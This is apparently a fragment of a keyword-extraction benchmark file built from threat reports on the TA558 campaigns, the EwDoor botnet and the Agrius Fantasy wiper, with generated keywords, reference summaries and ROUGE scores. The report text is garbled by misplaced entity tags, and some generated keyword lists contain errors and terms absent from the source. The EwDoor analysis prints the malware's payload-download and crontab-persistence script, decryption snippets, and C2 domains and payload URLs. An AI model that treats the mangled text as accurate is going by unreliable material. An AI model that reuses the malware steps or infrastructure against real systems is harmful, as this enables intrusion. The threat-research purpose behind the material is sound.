[PERCENT] four [PERCENT] percent featuring multiple language lure samples in [LANGUAGE] English , [LANGUAGE] Spanish , or [LAW] Portuguese.8/11Figure [LAW] 11 : Campaign totals by language since [DATE] 2018Interestingly , the threat actor often switches languages in [DATE] the [DATE] same [DATE] week . Proofpoint researchers have observed this actor send , for example , a campaign in [LANGUAGE] English and the following day another campaign in [LANGUAGE] Portuguese . Individual targeting typically differs based on campaign language . Notable Campaign ArtifactsIn addition to the consistent lure themes , targeting , message content , and malware payloads , [GPE] Proofpoint researchers observed TA558 using multiple notable patterns in campaign data including the use of certain strings , naming conventions and keywords , domains , etc . For example , the actor appears to repeat the term [PERSON] CDT in email and malware attributes . This may relate to the [ORG] CDT [ORG] Travel organization and related travel reservation lure themes . Proofpoint researchers observed TA558 use the [ORG] CDT term in [CARDINAL] dozens of campaigns since [DATE] 2018 , in C2 domains , replyto email addresses , payload URLs , scheduled task name , and [ORG] Microsoft [ORG] Office document metadata ( i.e. , Author , Last Saved By ) , and [ORG] Microsoft [ORG] Office macro language . Throughout many of the [DATE] 2019 and [DATE] 2020 campaigns the threat actor used various URLs from the domain sslblindado[.]com to download either helper scripts or malware payloads . Some examples include : microsofft[.]sslblindado[.]com passagensv[.]sslblindado[.]com system11[.]sslblindado[.]comLike other threat actors , this group sometimes mimics technology service names to appear legitimate . For example , using terms in payload URLs or [CARDINAL] C2 domain names . Some examples include : microsofft[.]sslblindado[.]com firefoxsystem[.]sytes[.]net googledrives[.]ddns[.]netAnother interesting pattern observed were common strings like \u201c success \u201d and \u201c pitbull \u201d . In several campaigns [ORG] Proofpoint researchers spotted these strings in C2 domains . Some examples include : successfully[.]hopto[.]org success20[.]hopto[.]org 4success[.]zapto[.]orgFrom 2019 through [DATE] 2020 , [PRODUCT] TA558 conducted [CARDINAL] 10 campaigns used the keyword \u201c [GPE] Maringa \u201d or \u201c [PERSON] Maaringa \u201d in payload URLs or email senders . [GPE] Maringa is a city in [GPE] Brazil . Examples include : maringareservas[.]com[.]br / seila[.]rtf maringa[.]turismo@system11[.]com[.]brPossible [ORG] ObjectivesProofpoint has not observed post - compromise activity from TA558 . Based on the observed payloads , victimology , and campaign and message volume , [GPE] Proofpoint assesses with medium to high confidence that this is a financially motivated cybercriminal actor . The malware used by TA558 can steal data including hotel customer user and credit card data , allow lateral movement , and deliver follow - on payloads.9/11Open - source reporting provides insight into [CARDINAL] one possible threat actor objective . In [DATE] July , [ORG] CNN [ORG] Portugal reported a [NORP] Portuguese hotel \u2019s website was compromised , and the actor was able to modify the website and direct customers to a fake reservation page . The actor stole funds from potential customers by posing as the compromised hotel . Although [GPE] Proofpoint does not associate the identified activity with TA558 , it provides an example of possible follow - on activity and the impacts to both target organizations and their customers if an actor is able to compromise hotel or transportation entities . [ORG] ConclusionTA558 is an active threat actor targeting hospitality , travel , and related industries since [DATE] 2018 . Activity conducted by this actor could lead to data theft of both corporate and customer data , as well as potential financial losses . Organizations , especially those operating in targeted sectors in [LOC] Latin [LOC] America , [LOC] North [LOC] America , and [LOC] Western [LOC] Europe should be aware of this actor \u2019s tactics , techniques , and procedures . Indicators of Compromise ( IOCs)The following IOCs represent a sample of indicators observed by [ORG] Proofpoint researchers associated with TA558.C2 DomainsIndicatorDescriptionRevengeRAT C2 Domain njRAT / RevengeRAT C2 Domain vjw0rm C2 Domainquedabesouro[.]ddns[.]net queda212[.]duckdns[.]org 3030pp[.]hopto[.]org vemvemserver[.]duckdns[.]org Houdini / Loda C2 Domain [CARDINAL] 4success[.]zapto[.]org success20[.]hopto[.]org msin[.]hopto[.]org cdtpitbull[.]hopto[.]org 111234cdt[.]ddns[.]net cdt2021[.]zapto[.]org 38[.]132[.]101[.]45Loda C2 Domain Loda C2 Domain Loda C2 Domain AsyncRAT C2 Domain njRAT / AsyncRAT C2 Domain AsyncRAT C2 Domain RevengRAT C2 IPDate Observed [DATE] 2018 and [DATE] 2019 [DATE] 2021 and 2022 2021 and [DATE] 2022 [DATE] 2021 and [DATE] 2022 [DATE] 2021 and 2022 2022Payload URLsIndicatorDescription hxxp[://]cdtmaster[.]com[.]br / DadosDaReserva[.]doc RTF payload URL Loda Payload URL hxxp[://]hypemediardf[.]com[.]pl / css / css[.]doc AsyncRAT Payload hxxps[:]//brasilnativopousada[.]com[.]br / Final[.]txt URL hxxps[:]//www[.]unimed- AsyncRAT Scheduled corporated[.]com / microsoft[.]txt [ORG] Task [ORG] URL hxxps[:]//unimed [ORG] - corporated[.]com / tur / turismo[.]jpg AsyncRAT [ORG] ScheduledTask URLET SignaturesETPRO [PERSON] MALWARE [PERSON] Loda Logger CnC ActivityETPRO TROJAN MSIL / Revenge - RAT Keep - Alive Activity ( Outbound)ETPRO [ORG] TROJAN MSIL / [ORG] Revenge [ORG] - [ORG] RAT [ORG] CnC [ORG] CheckinETPRO [ORG] TROJAN MSIL / [ORG] Revenge [ORG] - [ORG] RAT [ORG] CnC [ORG] Checkin M2ETPRO TROJAN MSIL / [ORG] Revenge [ORG] - [ORG] RAT [ORG] CnC [ORG] Checkin [ORG] M4ETPRO [ORG] TROJAN njRAT / Bladabindi Variant CnC Activity ( inf)ETPRO TROJAN Generic njRAT / Bladabindi CnC Activity ( act)ETPRO TROJAN Generic njRAT / Bladabindi CnC Activity ( inf)ET [LAW] TROJAN [LAW] Bladabindi / njRAT [ORG] CnC [ORG] Command ( ll)DateObserved [CARDINAL] 20212021202210/1111/11", "generated_text": "Proofpoint; TA558; academic; hotel; travel organizations; Latin America; 2017; tactics; techniques; procedures; Loda RAT; Revenge RAT; 2019; 2018; campaigns; Word documents; Equation Editor vulnerabilities; remote access trojans; Revenge RAT; Loda RAT; Vjw0rm; Revenge RAT; control; infrastructure; additional targeting; Western Europe; North America; the group; a higher average; activity; the past four years; techniques; procedures; the threat actor.", "ref_text": "<START-1>The document describes the activities of a financially-motivated cybercrime group called TA558 that has been targeting the hospitality, travel, and tourism industries since at least 2018. TA558 sends phishing emails containing malicious attachments or links to victims, typically hotels, travel agencies, and other tourism-related businesses. The emails use reservation and booking themes as lures. If victims open attachments or click links, TA558 installs remote access trojans like Loda RAT or Revenge RAT on their systems. TA558 mainly targets organizations in Latin America and Spanish/Portuguese speakers, but has expanded to Western Europe and North America over time. The group was most active in 2020, but increased attacks again in 2022. In 2022, TA558 shifted away from macro documents to using ISO and RAR files likely to bypass new Microsoft macro restrictions. The remote access trojans installed by TA558 can be used to steal sensitive customer and corporate data. They also allow lateral movement and deployment of additional malware. The group has used at least 15 different malware families over time. TA558 customizes attacks for each target, but repeatedly uses the string \"CDT\" in its infrastructure, possibly referring to a travel company. The group poses an ongoing threat to travel and hospitality entities globally, especially in Latin America. In summary, the document provides an overview of TA558 campaigns, tactics, infrastructure, targeting, and objectives as a financially-motivated actor that has consistently targeted the travel industry since 2018. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.402332361516035, "gpt3/lexical/rouge_rouge2": 0.10557184750733138, "gpt3/lexical/rouge_rougeL": 0.22157434402332363, "gpt3/lexical/rouge_rougeLsum": 0.22157434402332363, "gpt3_generated_text": ["This article from Proofpoint discusses the threat actor TA558, which has been targeting hospitality, hotel, and travel organizations in Latin America, Western Europe, and North America since 2018. The group uses consistent tactics, techniques, and procedures to distribute malware, including Loda RAT, Vjw0rm, and Revenge RAT. TA558 primarily targets Portuguese and Spanish speakers and has recently increased its operational tempo. The group has shifted tactics in response to security measures, such as Microsoft's decision to block VBA macros downloaded from the internet. This report provides a comprehensive overview of TA558's activity over the past four years, detailing its campaigns, malware payloads, and infrastructure."]}, {"split_name": "test", "sample_id": "test_129", "prompt_text": "Extract the keywords: [PERSON] EwDoor [PERSON] Botnet Is Attacking [ORG] AT&T Customersblog.netlab.360.com/warning-ewdoor-botnet-is-attacking-att-customers/Alex.Turing30 [DATE] November [DATE] 2021 / DDoSNovember 30 , [DATE] 2021Background On [DATE] October 27 , [DATE] 2021 , our Botmon system ided an attacker attacking [PERSON] Edgewater Networks ' devices via [DATE] CVE-2017- [DATE] 6079 with a relatively unique mount file system command in its payload , which had our attention , and after analysis , we confirmed that this was a brand new botnet , and based on it 's targeting of [PERSON] Edgewater producers and its [ORG] Backdoor feature , we named it [ORG] EwDoor . The initial version of [ORG] EwDoor used a multi - C2 redundancy mechanism , and we registered the [ORDINAL] second C2 domain , iunno.se , which gave us the opportunity to measure its size . Unfortunately [ORG] EwDoor reconfigured its communication model after experiencing problems with the main C2 network failure , using [ORG] BT tracker to downlink [ORG] C2s , and in turn we lost sight of [ORG] EwDoor . However , during this brief observation , we confirmed that the attacked devices were [PRODUCT] EdgeMarc [PRODUCT] Enterprise [PRODUCT] Session [PRODUCT] Border [PRODUCT] Controller , belonging to the telecom company [ORG] AT&T , and that all [CARDINAL] 5.7k active victims that we saw durning the short time window were all geographically located in the US.So far , the [ORG] EwDoor in our view has undergone [CARDINAL] 3 versions of updates , and its main functions can be summarized into [CARDINAL] 2 main categories of [ORG] DDoS attacks and [ORG] Backdoor . Based on the attacked devices are telephone communication related , we presume that its main purpose is DDoS attacks , and gathering of sensitive information , such as call logs . Given the size , activity of [ORG] EwDoor , and sensitivity of the infected devices , we decided to write this paper to share our findings with the community . [DATE] TimelineOctober 27 , [DATE] 2021 , [ORDINAL] first capture of [ORG] EwDoor , version [CARDINAL] number [CARDINAL] 0.12.0 , main features are [PERSON] DDoS [PERSON] Attack , File Manager , [PERSON] Reverse [PERSON] Shell , [NORP] Port [NORP] Scan , etc . [DATE] November [DATE] 8 , [DATE] 2021 , [ORG] EwDoor was updated to version number [CARDINAL] 0.15.0 , moving [CARDINAL] C2 from local to cloud , using [ORG] BT [ORG] Trackers . [DATE] November [DATE] 15 , [DATE] 2021 , [ORG] EwDoor updated to version [CARDINAL] 0.16.0 , minor update , adding sandbox confrontation features . [DATE] November [DATE] 20 , [DATE] 2021 , [ORG] EwDoor was updated version [CARDINAL] 0.16.0 , minor update , adding more [ORG] BT [ORG] Trackers . [ORG] EwDoor [ORG] Overview We have captured a total of [CARDINAL] 3 versions of [ORG] EwDoor , with version [MONEY] 0.16.0 as a blueprint , we can characterize [PERSON] EwDoor as , a botnet that sends C2 down through [ORG] BT tracker , uses TLS to protect traffic , and mainly profits by means of [ORG] DDoS attacks and sensitive data theft , which currently propagates through the [DATE] Nday vulnerability CVE-2017 - [ORG] 6079 , mainly targeting [PRODUCT] EdgeMarc [PRODUCT] Enterprise [PRODUCT] Session [PRODUCT] Border [PRODUCT] Controller devices . Currently supports [CARDINAL] 6 major functions . Self updating Execute arbitrary commandsIts basic loigic is shown below.1/18Size By grabbing the author 's unregistered CC domain name , we were able to measure the size of this Botnet for a little while , when the active Bot [ORG] IP was around [CARDINAL] 5.7k . The AS numbers of the infected device IPs were all AS7018|AT&T_Services,_Inc . ( [ORG] AT&T , an [NORP] American telecom company ) . By back - checking the SSl certificates used by these devices , we found that there were [CARDINAL] about [CARDINAL] 100k IPs using the same SSl certificate . We are not sure how many devices corresponding to these IPs could be infected , but we can speculate that as they belong to the same class of devices the possible impact is real.ew.door.sipShell script analysis [ORG] EwDoor 's [ORG] SHELL script is quite long , we extracted the key parts for [ORG] analysis.2/18setup_ramdisk ( ) { dd if=/dev / [CARDINAL] zero of=$RAMDISK bs=4096k count=1 gunzip -c $ IMAGE > $ RAMDISK mkdir -p $ MOUNT mount [MONEY] $ RAMDISK [MONEY] $ MOUNT}download_update ( ) { killall -9 ewstat sleep $ [ ( [MONEY] $ RANDOM [MONEY] % [CARDINAL] 10 ) + 1 ] rm -f $ IMAGE rm -f $ EW_BIN wget -O [MONEY] $ IMAGE [MONEY] $ 1grep \" $ EW_BIN \" /etc / config / crontab > /dev / null [CARDINAL] 2>&1 # is it not already in the crontab ? if [ $ ? ! = [CARDINAL] 0 ] ; then echo \" * * * * * root $ EW_BIN > /dev / null [CARDINAL] 2>&1 & \" > > /etc / config / crontab fisleep 1cfg_commit}It can be seen that the main functions of the [ORG] SHELL script areDownload and execute EwDoor samples Set up Crontab for persistenceIt is also worth mentioning that [GPE] EwDoor samples are stored in the form of gzip on the download server , which to a certain extent escapes the security detection for binary files ; the authors of earlier versions made the sample files into Linux rev [CARDINAL] 1.0 ext2 filesystem files and then used mount to mount the files on the system , which is probably another trick to protect itself . Sample Analysis ELF [CARDINAL] 32 - bit [ORG] MSB executable , [ORG] MIPS , [ORG] MIPS - I version [CARDINAL] 1 ( [ORG] SYSV ) , dynamically linked , interpreter /lib / ld- uClibc.so.0 , stripped Packer : none Version : [CARDINAL] 0.16.0Ewdoor uses dynamic linking , and although it adopts some anti - reverse techniques , there is not much difficulty in reversing it . In general , the function is relatively simple . When it runs on the infected device , it [ORDINAL] first collects device information , them performs soem common things such as single instance , persistence and other functions ; then decrypts the bt tracker and obtains C2 by accessing the bt tracker ; finally reports the collected device information to C2 and executes the commands issued by C2.Now let [NORP] \u2019s analyze the implementation of [PRODUCT] EwDoor [CARDINAL] one by [CARDINAL] one from [CARDINAL] 3 aspects : safeguard , host behavior and network communication . SafeguardsTLS protocol is used at the network level to prevent communication from being intercepted . Sensitive resources are encrypted to make it more difficult to reverseC2 has moved from local to \" cloud \" and sent by [ORG] BT tracker to prevent direct extraction by [ORG] IOC [ORG] system.3/18Modify the \" ABIFLAGS \" PHT in [ORG] ELF to counter qemu - user and some high kernel versions of the linux sandbox . This is a relatively rare countermeasure , which shows that the author of [ORG] EwDoor is very familiar with the Linux kernel , [ORG] QEMU , and [PERSON] Edgewater devices . The following error is generated when actually running a simulation with qemu - user.write(2 , \" /tmp / echuysqs : [ORG] Invalid PT_MIPS_ABIFLAGS entry\\n \" , 46)Host behavior When Ewdoor runs , it will check the file name and parameters . When the file name is \" /var / tmp/.mnt / ewupdate \" , it means that this is an update operation , and then it will copy itself to ewstat by the command cp -f /var / tmp/.mnt / ewupdate /var / tmp/.mnt / ewstat and then start the execution ; when there are no start parameters , or the [ORDINAL] first start is not script , then the /etc / config / ew.conf script is executed via bash ; only when the [ORDINAL] first boot data is script , the processing logic below is executed , which is in a way also a countermeasure to the sandbox / simulator . Single instanceEwdoor implements single instance by means of a file lock , as shown below.4/18We can use /proc / locks to observe the process and corresponding lock files , and then execute the [ORG] EwDoor , we can see that no new processes are created.5/18Collecting device information [ORG] Ewdoor collects the hostname , [ORG] NIC address , etc . of the compromised device for use later in the registration process . [ORG] PersistenceEwdoor periodically terminates the netflash process in the system with the following code . netflash command is a maintenance command used to update the system remotely . [ORG] EwDoor achieves persistence by blocking the maintenance channel and then working with the crontab in the [ORG] SHELL script . Network [ORG] communication6/18Ewdoor stores the encrypted network related sensitive resources , such as registration information , [CARDINAL] C2 , ports , etc . in the sample . Therefore , when bots want to communicate with C2 , they have to decrypt this part of the resources [ORDINAL] first , then get the [CARDINAL] C2 either directly or indirectly , and then finally establish communication with the C2 and wait for the execution of the commands issued by the [GPE] C2.DecryptionEwdoor uses [CARDINAL] 3 tables to describe the encrypted resources , one is the ciphertext table , one is the ciphertext length table and one is the combination table . The ciphertext & ciphertext length table are used to describe the encrypted resource itself , while the combination table is used to describe how the resource is used in combination . The cipher table and cipher length table can decrypt BT domain , [ORG] BT port and other information , while the combination table can plen_base=0x00455A14key=\"\u0445\u043e\u043b\u043e\u0434\u043d\u043e \u0432 \u0434\u043e\u043c\u0435 \u043f\u0430\u043f\u0430 \u0432 \u0442\u0443\u0436\u0443\u0440\u043a\u0435 \u043c\u0430\u043c\u0430 \u0434\u043e\u0447\u0443\u0440\u043a\u043e\u044e \u0442\u043e\u043f\u0438\u0442 \u0432 \u043f\u0435\u0447\u0443\u0440\u043a\u0435 ! \" cnt=0while idc.get_wide_dword(plen_base)!=0 : plain= '' blen = idc.get_wide_dword(plen_base ) pbuf = idc.get_wide_dword(pbuf_base ) buf = idc.get_bytes(pbuf , blen ) for i in [GPE] range(blen ): tmp = chr(ord(buf[i])^cnt ^ [PERCENT] ord(key[i [PERCENT] % len(key ) ] ) ) if cnt > = [CARDINAL] 62 : table item [CARDINAL] 12 is combined with table item [CARDINAL] 7 , and so on . The combination of [ [CARDINAL] 11 , 1 ] and [ [CARDINAL] 12 , 7 ] gives the addresses of [CARDINAL] 2 BT trackers \" tracker.birkenwald.de : [CARDINAL] 6969 \" and \" ipv6.tracker.zerobytes.xyz:16661 \" respectively . Getting C28/18EwDoor gets C2 in different ways in different versions . In version 0.12.0 , the direct method is used , while in [CARDINAL] 0.15 , [CARDINAL] 0.16 , pbuf_base=0x00467814 plen_base=0x00456100key=\"TheMagicalMysteryTourIsComingToTakeYouAway ! \" cnt=0 while idc.get_wide_dword(plen_base)!=0 : plain= '' blen = idc.get_wide_dword(plen_base ) pbuf = idc.get_wide_dword(pbuf_base ) buf = idc.get_bytes(pbuf , blen ) for i in [GPE] range(blen ): tmp = chr(ord(buf[i])^cnt ^ [PERCENT] ord(key[i [PERCENT] % len(key ) ] ) ) if cnt>=18 : breakThe decrypted resources are shown in the following table , table entries [CARDINAL] 1 to [CARDINAL] 14 are [ORG] C2s , table entries [CARDINAL] 15 to [CARDINAL] 17 are The so - called indirect method , that is , after the above decryption process to get the [ORG] BT tracker , a specific request to the [ORG] BT tracker has to be made to get C2 , this process uses [CARDINAL] two functions \" bt_generate_daily_hash_and_port \" and \" bt_try_find_good_peers \" , the former is used to get the [CARDINAL] C2 port , the latter is used to get the [CARDINAL] C2 IP.The implementation of the bt_generate_daily_hash_and_port function is shown below , the specific logic is to format the current time as \" % d%m%Y \" , then splice it with \" 1HAT2BWL \" , then calculate the SHA1 value of this string , and then calculate the last 2 bytes of SHA1 to get the port of [ORG] C2.9/18In fact , the port calculated in the above step is not the real port value , it needs to add [CARDINAL] 10 . The process is shown in the figure below.10/18The implementation of the bt_try_find_good_peers function is shown below . The specific logic is to send the above SHA1 value as infohash to the bt tracker , and get the C2 : PORT through [ORG] the [ORG] Tracker [ORG] UDP protocol . If the [GPE] PORT is equal to the above port value , then this [ORG] IP is the IP of C2.The following figure shows the network traffic generated on 2021.11.22 as an example . The red part is the [PERSON] SHA1 value of the string \" 1HAT2BWL22112021 \" , the last 2 bytes of which are [DATE] 0x23a2 , and the port \" [CARDINAL] 0xc6fc \" of C2 is obtained by the following code operation.sha18=0x23 sha19=0xa2def tohex(val , nbits):return hex((val + ( 1 < < nbits ) ) % ( 1 < < nbits))port = sha19+((sha18&0xf)<<8)-15536 + 10print tohex(port,16)11/18The SHA1 value calculated above will be sent to [ORG] BT tracker as infohash , and then compare the server port returned When Ewdoor successfully obtains C2 , it [ORDINAL] first establishes a connection through TLS protocol , then sends the registration information to C2 , and finally waits for the execution of the command sent by C2 . In this process , according to the different versions , the communication protocols with C2 can be divided into the following [CARDINAL] two major [ORG] categories.0.12 version protocol0x01 : TLS connectionThe TLS connection itself is not worth talking about , but the interesting point is that in version [CARDINAL] 0.12 , the author of [ORG] EwDoor made a mistake . As shown in the figure below , in version [CARDINAL] 0.12 , [ORG] Ewdoor decrypted [CARDINAL] C2 by \" [WORK_OF_ART] resolving_and_connect_first \" to establish a connection with C2 . The values of parameters a1,a2 are taken from res_range , which requires a2>=a1 to perform creates a bug that causes the [ORG] C2s numbered [CARDINAL] 8 to [CARDINAL] 14 to never be connected , but the [ORG] Ewdoor authors quickly realized The following code constructs the registration packet , which includes the decrypted string from index [CARDINAL] 0 , version number , device host name , device [ORG] NIC address and other information . The actual traffic generated is shown below.00000000 [CARDINAL] 48 [CARDINAL] 45 4c [CARDINAL] 4f 20 30 [CARDINAL] 2e 31 32 [CARDINAL] 2e 30 [CARDINAL] 20 46 30 [CARDINAL] 4a 45 |HELO 0.12.0 F0JE| 00000010 41 41 44 57 53 34 6b 51 46 6a 37 69 50 4f 51 79 |AADWS4kQFj7iPOQy| 00000020 6a 41 20 64 65 62 69 [CARDINAL] 61 6e [CARDINAL] 2d 6d 69 70 73 20 31 |jA debian - mips 1| 00000030 32 33 34 35 36 [CARDINAL] 0a |23456.|0x03 : Supported commands After successful registration with [ORG] C2 , [ORG] Ewdoor waits for the execution of commands issued by [CARDINAL] C2 . The commands supported by version [CARDINAL] 0.12 are shown in the following [CARDINAL] table.cmdufsfcatpingexecexec2pscanpurposeudp floodsyn floodexec \" cat \" cmdheartbeatrun cmd via bashrun cmd via popenport scanunameexec \" uname \" cmd13/18cmdpurposeupdatewrite \" /tmp/.ewupdate\"reversereverse shelldownload download file via wget0.15&0.16 version protocol0x01 : TLS connection Nothing special here.0x02 : [PERSON] RegistrationThe following code is used to construct the registration packet . The data includes the decrypted string from index [CARDINAL] 0 , version number , device host name , device [ORG] NIC address and other information . The actual traffic generated is shown below.00000000 [CARDINAL] 00 [CARDINAL] 3b 00 00 00 00 00 00 00 00 02 00 06 30 [CARDINAL] 2e 31 | . ; [CARDINAL] 0.1| [CARDINAL] 00000010 [CARDINAL] 36 2e 30 00 13 4f 72 [CARDINAL] 4f 69 62 32 [CARDINAL] 7a 43 49 57 61 |6.0 OrOib2zCIWa| 00000020 31 30 76 32 62 [CARDINAL] 75 [CARDINAL] 6e [CARDINAL] 4a 00 0b [CARDINAL] 64 [CARDINAL] 65 62 69 [CARDINAL] 61 [CARDINAL] 6e |10v2bunJ debian| 00000030 [CARDINAL] 2d [CARDINAL] 6d 69 70 73 00 06 31 32 33 34 35 [CARDINAL] 36 |-mips 123456| 0000003d0x03 : Command signature verificationAfter successfully registration , Ewdoor waits for C2 to issue the instruction , which consists of \" len(2 bytes ) [PERSON] + [PERSON] Signature(512 bytes ) + sessionid(8bytes ) + cmd \" [CARDINAL] 4 parts , when receiving the instruction , [ORG] Ewdoor will verify the instruction by proto_verify_signature function . By doing this [GPE] Ewdoor ensures that the whole network is fully controllable and not stolen by others.14/18The pubkey is encrypted and stored in the sample , which is [CARDINAL] 550 bytes in total , and the real public key can be obtained after the 0x2aTake the payload received in practice as an example , it can be divided into [CARDINAL] 4 parts according to the format described above.15/18The above payload can be easily verified by the pk_verify tool that comes with mbedtls.>md5 pubkey > md5 msg.sig > cat msg | hexdump -C 00000000 00 00 00 00 00 00 01 07 01 > pk_verify.exe pubkey msg . Reading public key from ' pubkey ' . Verifying the SHA-256 signature . OK ( the signature is valid)When the command passes the check , the specific command is just executed , here the command number is [CARDINAL] 1 , which is the heartbeat command.0x04 : Supported commands The commands supported by version [CARDINAL] 0.15 , [CARDINAL] 0.16 are shown in the following table.cmd index purpose1heartbeat16/18cmd index purpose2456789port scanexec \" uname \" cmddownload file via wgetupdate , write \" /var / tmp/.ewupdate\"run cmd via bashrun cmd via popenddos attackMiscellaneousThe author of [GPE] Ewdoor is a little bit of a bug fixer ! We d Oct 27 18:01:33 [DATE] 2021 , max compressionFrom The xor keys to actor profile . The [ORDINAL] first used key \" TheMagicalMysteryTourIsComingToTakeYouAway ! \" , is the from The Beatles . The [ORDINAL] second used key \" \u0445\u043e\u043b\u043e\u0434\u043d\u043e \u0432 \u0434\u043e\u043c\u0435 \u043f\u0430\u043f\u0430 \u0432 \u0442\u0443\u0436\u0443\u0440\u043a\u0435 \u043c\u0430\u043c\u0430 \u0434\u043e\u0447\u0443\u0440\u043a\u043e\u044e \u0442\u043e\u043f\u0438\u0442 \u0432 \u043f\u0435\u0447\u0443\u0440\u043a\u0435 ! \" According to google translate , it is \" It \u2019s cold in the house , dad in a jacket , mom drowns her daughter in the stove ! \" , kinda creepy!The note from the author After finding our honeypot [ORG] IP in [DATE] November , he called us out in the paylaod , as can be seen from below . Contact us rtmxvd.iunno.se ekgmua.zapto.org boatreviews.xpresit.net a.rtmxvdio.net a.hatbowlu3hf.ru a.hatbowlrtx.su rtmxvd.iunno.se hhqnyy.zapto.org besthatsite.mooo.com b.rtmxvdio.net b.hatbowlu3hf.ru b.hatbowlrtx.suport : [CARDINAL] 53 \uff0c 443\uff0c13433Downloaderurl url url url url url", "generated_text": "the article; EwDoor; targets; security; EdgeMarc Enterprise Session Border Controller; AT&T; a new botnet; October 27; 0.12.0; a backdoor; the attacker; EdgeWater Networks; 5.7k; US; the device; file system command; NTLM; the backdoor; the attacker; a multi-C2 redundancy mechanism; the second C2 domain; iunno.se; the opportunity; its size; failure; TLS; BT Trackers; an update; sandbox confrontation; the Botnet; the size; the original version; the 0.7; the size; the customer; the size; the time; the IP addresses; IP addresses; physical addresses; the code; its name.", "ref_text": "<START-1>The report analyzes a new IoT botnet called EwDoor that is targeting AT&T customers through vulnerabilities in Edgewater Networks devices. EwDoor was first observed on October 27, 2021 and has gone through several iterations, with its main capabilities being DDoS attacks and backdoor access. The botnet infects EdgeMarc devices to steal sensitive information and carry out DDoS attacks. The analysis examines EwDoor's technical details including its persistence mechanisms, device profiling, command and control communication, and anti-analysis protections. Key findings are that it uses BT trackers to retrieve C2 servers and TLS to encrypt traffic. During a brief visibility period, the botnet was tracked to around 5,700 infected devices located in the US and tied to AT&T's network. The true scale is estimated to be much larger based on certificate analysis. Overall, the report sheds light on a sophisticated new IoT botnet that is actively exploiting devices to compromise telephone networks. It provides an in-depth review of EwDoor's workings and capabilities as an emerging threat to monitor.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4579710144927536, "gpt3/lexical/rouge_rouge2": 0.0932944606413994, "gpt3/lexical/rouge_rougeL": 0.24927536231884057, "gpt3/lexical/rouge_rougeLsum": 0.24927536231884057, "gpt3_generated_text": ["The article discusses the emergence of a new botnet, EwDoor, which targets the security of EdgeMarc Enterprise Session Border Controller devices belonging to the telecom company AT&T. The botnet was first captured on October 27, 2021, with version 0.12.0, and has since undergone several updates. The botnet uses a backdoor to gain access to the devices and has a multi-C2 redundancy mechanism, as well as using TLS to protect traffic and BT trackers for communication. The botnet has been observed to have around 5.7k active victims in the US, all belonging to the same telecom company. The article provides a detailed overview of the botnet's functions and behaviors, including its ability to self-update and execute arbitrary commands. The botnet's shell script is also analyzed, revealing its methods for setting up a RAM disk and downloading updates. The article concludes by highlighting the potential impact of the botnet on the security of the affected devices and the need for further investigation and mitigation efforts."]}, {"split_name": "test", "sample_id": "test_130", "prompt_text": "Extract the keywords: www.welivesecurity.com /2022/12/07 / fantasy - new - agrius - wiper - supply - chain - attack/ Fantasy \u2013 a new Agrius wiper deployed through a supply\u2011chain attack \u22ee [CARDINAL] 12/7/2022Adam Burgher 7 Dec 2022 - 11:30AMESET researchers analyzed a supply - chain attack abusing an [NORP] Israeli software developer to deploy [GPE] Fantasy , Agrius \u2019s new wiper , with victims including the diamond industryESET researchers discovered a new wiper and its execution tool , both attributed to the Agrius APT group , while analyzing a supply - chain attack abusing an [NORP] Israeli software developer . The group is known for its destructive operations . In [DATE] February [DATE] 2022 , Agrius began targeting [NORP] Israeli HR and IT consulting firms , and users of an [NORP] Israeli software suite used in the diamond industry . We believe that Agrius operators conducted a supply - chain attack abusing the [NORP] Israeli software developer to deploy their new wiper , [GPE] Fantasy , and a new lateral movement and [GPE] Fantasy execution tool , Sandals . The Fantasy wiper is built on the foundations of the previously reported [PERSON] Apostle wiper but does not attempt to masquerade as ransomware , as [PERSON] Apostle originally did . Instead , it goes right to work wiping data . [NORP] Victims were observed in [GPE] South [GPE] Africa \u2013 where reconnaissance began [DATE] several [DATE] weeks before [GPE] Fantasy was deployed \u2013 [GPE] Israel , and [GPE] Hong [GPE] Kong . Key points of this blogpost : Agrius conducted a supply - chain attack abusing an [NORP] Israeli software suite used in the diamond industry . The group then deployed a new wiper we named Fantasy . Most of its code base comes from [GPE] Apostle , Agrius \u2019s previous wiper . Along with Fantasy , Agrius also deployed a new lateral movement and [GPE] Fantasy execution tool that we have named Sandals . [NORP] Victims include [NORP] Israeli HR firms , IT consulting companies , and a diamond wholesaler ; a [NORP] South [NORP] African organization working in the diamond industry ; and a jeweler in [GPE] Hong [GPE] Kong . Group overviewAgrius is a newer [GPE] Iran - aligned group targeting victims in [GPE] Israel and [GPE] the [GPE] United [GPE] Arab [GPE] Emirates since [DATE] 2020 . The group initially deployed a wiper , [GPE] Apostle , disguised as ransomware , but later modified [GPE] Apostle into fully fledged ransomware . Agrius exploits known vulnerabilities in internet - facing applications to install webshells , then conducts internal reconnaissance before moving laterally and then deploying its malicious payloads . Campaign overviewOn [DATE] February 20th , [DATE] 2022 at an organization in the diamond industry in [GPE] South [GPE] Africa , Agrius deployed credential harvesting tools , probably in preparation for this campaign . Then , on [DATE] March 12th , [DATE] 2022 , Agrius launched the wiping attack by deploying [ORG] Fantasy [ORG] and [ORG] Sandals , [ORDINAL] first to the victim in [GPE] South [GPE] Africa and then to victims in [GPE] Israel and lastly to a victim in [GPE] Hong [GPE] Kong . [NORP] Victims in [GPE] Israel include an IT support services company , a diamond wholesaler , and an HR consulting firm . [NORP] South [NORP] African victims are from a single organization in the diamond industry , with the [GPE] Hong [GPE] Kong victim being a jeweler.1/10Figure [CARDINAL] 1 . Victim timeline and locationsThe campaign lasted [TIME] less [TIME] than [TIME] three [TIME] hours and within that timeframe ESET customers were already protected with detections identifying [GPE] Fantasy as a wiper , and blocking its execution . We observed the software developer pushing out clean updates within [TIME] a [TIME] matter [TIME] of [TIME] hours of the attack . We reached out to the software developer to notify them about a potential compromise , but our enquiries went unanswered . Preparing for departureThe [ORDINAL] first tools deployed by Agrius operators to victim systems , through means unknown , were : [ORG] MiniDump , \u201c a C # implementation of mimikatz / pypykatz minidump functionality to get credentials from LSASS dumps \u201d SecretsDump , a Python script that \u201c performs various techniques to dump hashes from [ a ] remote machine without executing any agent there \u201d Host2IP , a custom C#/.NET tool that resolves a hostname to an [ORG] IP address . Usernames , passwords , and hostnames collected by these tools are required for Sandals to successfully spread and execute the Fantasy wiper . Agrius operators deployed [PRODUCT] MiniDump and [ORG] SecretsDump to this campaign \u2019s [ORDINAL] first victim on [DATE] February 20th , [DATE] 2022 , but waited until [DATE] March 